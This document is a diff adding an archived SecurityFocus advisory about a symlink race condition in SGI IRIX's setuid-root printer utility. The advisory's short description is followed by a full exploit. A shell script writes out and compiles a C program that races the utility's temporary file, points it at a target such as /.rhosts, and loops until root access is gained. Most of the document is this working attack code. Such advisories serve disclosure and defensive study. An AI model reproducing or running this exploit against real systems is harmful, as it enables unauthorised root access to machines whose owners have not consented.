@@ -1,0 +1,52 @@
+source: http://www.securityfocus.com/bid/330/info
+
+SGI's IRIX 5.x and 6.x operating system include a utility called /usr/lib/netaddpr. This program can be used by privledged users to add network printing devices to the system. A race condition exists in this program that could allow any "privledged" user to obtain root access.
+
+The netaddpr program is shipped setuid root. As part of its execution, it creates a file in /var/tmp with the file template printersXXXXXX. Because the creation of the file and the actual opening of the file are independant events, there exists a window, during which time an attacker can replace the file with a symbolic link. By making this link point to, for instance, /.rhosts, an attacker can elevate their privledges to that of root. 
+
+#!/bin/sh
+
+PROG="`basename $0`"
+if [ $# -ne 1 ]; then
+       echo "Usage: $PROG <target>"
+       exit 1
+fi
+
+cat > expnetpr.c << _CREDIT_TO_ZOMO_
+void main(int argc, char *argv[])
+{
+    char *template = "/var/tmp/printersXXXXXX";
+    char *target;
+    int pid;
+
+    target = (char *)mktemp(template);
+
+    if ((pid = fork()) > 0) {
+            sleep(3);
+            umask(0);
+            execl("/usr/lib/addnetpr", "addnetpr", "localhost","+", 0);
+    }
+    else
+            while(1) {
+                    symlink(argv[1], target);
+                    unlink(target);
+            }
+
+}
+_CREDIT_TO_ZOMO_
+
+/bin/cc expnetpr.c -o expnetpr
+if [ ! -f expnetpr ]; then
+     echo "Couldn't compile expnetpr.c, lame! \nMake sure that C compiler has been installed from the IDO"
+     exit 1
+fi
+
+while(`true`)
+do
+      ./expnetpr $1&
+      PID=$!
+      sleep 15
+      ls -al $1
+      killall expnetpr
+      killall addnetpr
+done
